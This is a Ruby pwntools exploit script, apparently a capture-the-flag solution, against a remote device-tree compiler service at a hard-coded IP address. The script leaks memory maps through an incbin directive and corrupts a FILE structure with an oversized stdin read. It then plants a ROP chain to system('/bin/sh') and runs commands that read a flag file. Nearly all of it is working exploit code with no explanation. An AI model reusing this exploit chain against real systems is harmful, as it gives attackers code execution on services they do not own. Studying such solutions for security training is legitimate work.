#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '52.196.81.112', 3154
@local = false
# @p = 'dtc'
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('/lib/x86_64-linux-gnu/libc.so.6', checksec: false); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def sendp(payload)
  z.gets 'Size?'
  z.puts payload.size + 1
  z.gets 'Data?'
  z.write payload
end

sendp(<<-EOS)
/dts-v1/;
/ {
  a = /incbin/("/proc/self/maps");
};
EOS

maps = z.gets('syscall').lines

# pause
sendp(<<-EOS)
/dts-v1/;
/ {
a { a=<1>; };
};
/ {
a { b=<1>; };
};
/ {
  c = /incbin/("/dev/stdin", 0, 4294967399);
};
EOS

heap = maps.select { |l| l.include?('[heap]') }.last.split('-')[0].to_i(16)
log.dump heap.hex
# heap = h.heap.base
libc.address = maps.select { |l| l.include?('libc-2.31.so') }.first.split('-')[0].to_i(16)

stack = maps.select { |l| l.include?('[stack]') }.last.split('-')[0].to_i(16) + 0x1a808
log.dump stack.hex
base = heap + 0x6db0
# pause
pop_rdi = libc.address + 0x26b72
ret = pop_rdi + 1
bin_sh = libc.address + 0x1b75aa
z.write flat('c' * 0x130, 0xfbad3881, base, base, base, base, base, base, stack, stack + 2**32)
sleep(1)
# success rate ~ 1/10, let 0xff0 be longer (e.g. 0x1ff0) can have a higher probability but the payload would likely be
# separated on remote
z.write flat(pop_rdi, bin_sh) * (0xff0 / 16) + flat(ret, libc.symbols.system)
sleep(2)
z.puts('ls -la; cat /home/`whoami`/.r34d_Me_4_7h3_secr3t_f1ag; echo "Pwned"; exit')

z.interact
